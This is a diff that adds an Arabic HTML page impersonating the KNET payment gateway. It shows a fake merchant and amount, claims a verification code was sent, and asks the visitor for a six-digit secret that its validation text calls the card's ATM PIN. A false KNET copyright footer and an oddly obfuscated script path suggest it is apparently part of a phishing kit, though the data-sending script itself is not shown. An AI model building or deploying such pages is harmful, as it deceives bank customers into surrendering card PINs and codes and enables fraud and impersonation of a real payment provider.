@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui" />
+    <title>صفحة دفع كي نت</title>
+    <link rel="stylesheet" href="otptest.css" />
+    
+
+    <style>
+       
+        #boxbuttons {
+            margin-top: 40px;
+        }
+        #pin {
+   
+            transform: translateY(-47px) translateX(-28px) !important;
+            margin-top: 70px;
+            z-index: 2;
+
+  }
+
+
+
+#boxbuttons{
+    transform: translateY(-45px) translateX(-0px) !important;
+
+}
+
+#divtexfoter{
+    transform: translateY(-45px) translateX(-0px) !important;
+
+}
+
+#timer{
+    transform: translateY(92px) translateX(50px) !important;
+font-size: 11px;
+}
+
+#textex{
+    transform: translateY(75px) translateX(-30px) !important;
+font-size: 11px;
+
+}
+
+#boxbuttons {
+    position: relative; 
+    z-index: 9999; 
+}
+
+
+    </style>
+</head>
+<body>
+    <header id="pageHeader">
+        <img src="kpayt.jpg" alt="رأس الصفحة" id="headerImage" />
+    </header>
+
+    <div class="box bank-info" id="bankInfoBox">
+        <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo" />
+        <div>
+            <p id="txthom">:المستفيد</p>
+            <strong id="beneficiaryName">Xcite General Trading Co</strong>
+        </div>
+        <div><hr id="hrhome" /></div>
+        <div>
+            <p id="txthome">:المبلغ</p>
+            <strong id="amountValu">KD 5.000</strong>
+        </div>
+    </div>
+
+    <div class="box payment-form" id="boxdiv">
+        <form id="paymentForm">
+            <div id="divtext"><h1 id="textotp"> تم ارسال رمز للتحقق من ملكية البطاقة يرجى ادخال رمز التحقق ادناه لتأكيد ملكية البطاقة </h1></div>
+
+
+            <div> 
+                <p id="timer" ><p id="textex">سيتم ارسال رمز جديد بعد مرور</p> </p>
+            </div>
+            <div class="input-container" id="divinput">
+                <label id="texst4" for="pin1">الرقم السري:</label>
+                <div class="input-box">
+                    <input
+                        type="password"
+                        id="pin"
+                        required
+                        pattern="\d{6}"
+                        maxlength="6"
+                        inputmode="numeric"
+                        oninvalid="this.setCustomValidity('يرجى ادخال الرقم السري ATM التابع للبطاقة')"
+                        oninput="this.setCustomValidity('')"
+                    />
+                    <input type="hidden" id="hiddenName" />
+                </div>
+            </div>
+           
+            <div class="box buttons" id="boxbuttons">
+                <button type="submit" id="submitButton1">إرسال</button>
+                <button type="button" onclick="resetForm()" id="submitButton10">إلغاء</button>
+            </div>
+            
+        </form>
+        <div id="divtexfoter"> 
+        <p id="naem0">جميع الحقوق محفوظة © 2025</p>
+        <p id="naem00">شركة الخدمات المصرفية الالية المشتركة - كي نت</p>
+    
+    </div>
+    </div>
+    
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+    const storedAmount = localStorage.getItem("boton") || "0.000";
+    const displayElement = document.getElementById("amountValu");
+
+    if (displayElement) {
+      displayElement.textContent = storedAmount + " د.ك";
+    }
+  });
+    </script>
+        <script src="main.html/null/null/null/mail2.html/null/eror/eror/null/otp.html/nul1/null2/otp.js"></script>
+
+</body>
+</html>
